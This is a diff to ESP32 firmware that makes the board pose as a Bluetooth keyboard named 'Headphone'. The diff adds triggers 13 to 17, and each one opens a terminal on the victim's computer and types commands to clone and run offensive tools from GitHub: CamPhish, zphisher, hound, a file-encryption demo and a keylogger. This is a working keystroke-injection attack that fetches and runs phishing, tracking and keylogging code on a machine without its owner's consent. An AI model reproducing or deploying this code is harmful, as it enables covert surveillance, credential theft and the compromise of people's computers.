@@ -14,6 +14,11 @@
 #define BUTTON_10_PIN 23  // Trigger 10
 #define BUTTON_11_PIN 24  // Trigger 11
 #define BUTTON_12_PIN 26  // Trigger 12
+#define BUTTON_13_PIN 28  // Trigger 13
+#define BUTTON_14_PIN 25  // Trigger 14
+#define BUTTON_15_PIN 22  // Trigger 15
+#define BUTTON_16_PIN 11  // Trigger 16
+#define BUTTON_17_PIN 27  // Trigger 17
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -31,6 +36,11 @@ bool lastState9 = HIGH;
 bool lastState10 = HIGH;
 bool lastState11 = HIGH;
 bool lastState12 = HIGH;
+bool lastState13 = HIGH;
+bool lastState14 = HIGH;
+bool lastState15 = HIGH;
+bool lastState16 = HIGH;
+bool lastState17 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
@@ -63,6 +73,11 @@ void setup() {
   pinMode(BUTTON_10_PIN, INPUT_PULLUP);
   pinMode(BUTTON_11_PIN, INPUT_PULLUP);
   pinMode(BUTTON_12_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_14_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_15_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_16_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_17_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -81,6 +96,11 @@ void loop() {
     bool state10 = digitalRead(BUTTON_10_PIN);
     bool state11 = digitalRead(BUTTON_11_PIN);
     bool state12 = digitalRead(BUTTON_12_PIN);
+    bool state13 = digitalRead(BUTTON_13_PIN);
+    bool state14 = digitalRead(BUTTON_14_PIN);
+    bool state15 = digitalRead(BUTTON_15_PIN);
+    bool state16 = digitalRead(BUTTON_16_PIN);
+    bool state17 = digitalRead(BUTTON_17_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -409,6 +429,121 @@ void loop() {
       delay(1000);
     }
 
+    // Trigger 13:
+    if (lastState13 == HIGH && state13 == LOW) {
+      Serial.println("Trigger 13: clone repo and run script");
+
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(500);
+
+      // Git clone
+      sendString("git clone https://github.com/techchipnet/CamPhish");
+      bleKeyboard.press(KEY_RETURN);
+      delay(3000); 
+      sendString("cd CamPhish");
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      sendString("bash camphish.sh");
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
+    // Trigger 14:
+    if (lastState14 == HIGH && state14 == LOW) {
+      Serial.println("Trigger 14: clone repo and run script");
+
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(500);
+
+      // Git clone
+      sendString("git clone --depth=1 https://github.com/htr-tech/zphisher.git");
+      bleKeyboard.press(KEY_RETURN);
+      delay(3000); 
+      sendString("cd zphisher");
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      sendString("bash zphisher.sh");
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
+    // Trigger 15:
+    if (lastState15 == HIGH && state15 == LOW) {
+      Serial.println("Trigger 15: clone repo and run script");
+
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(500);
+
+      // Git clone
+      sendString("git clone https://github.com/techchipnet/hound");
+      bleKeyboard.press(KEY_RETURN);
+      delay(3000); 
+      sendString("cd hound");
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      sendString("bash hound.sh");
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
+    // Trigger 16:
+    if (lastState16 == HIGH && state16 == LOW) {
+      Serial.println("Trigger 16: clone repo and run script");
+
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(500);
+
+      // Git clone
+      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git");
+      bleKeyboard.press(KEY_RETURN);
+      delay(5000); 
+      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-");
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      sendString("python3 code.py");
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
+    // Trigger 17:
+    if (lastState17 == HIGH && state17 == LOW) {
+      Serial.println("Trigger 17: clone repo and run script");
+
+      bleKeyboard.press(KEY_LEFT_CTRL);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('t');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(500);
+
+      // Git clone
+      sendString("git clone https://github.com/sachinpandey7709/Keylogger.git");
+      bleKeyboard.press(KEY_RETURN);
+      delay(3000); 
+      sendString("cd Keylogger");
+      bleKeyboard.press(KEY_RETURN);
+      delay(500);
+      sendString("python3 keylogger.py");
+      bleKeyboard.press(KEY_RETURN);
+      delay(1000);
+    }
+
     // update last states
     lastState1 = state1;
     lastState2 = state2;
@@ -422,6 +557,11 @@ void loop() {
     lastState10 = state10;
     lastState11 = state11;
     lastState12 = state12;
+    lastState13 = state13;
+    lastState14 = state14;
+    lastState15 = state15;
+    lastState16 = state16;
+    lastState17 = state17;
   }
 
   delay(10); // Small debounce
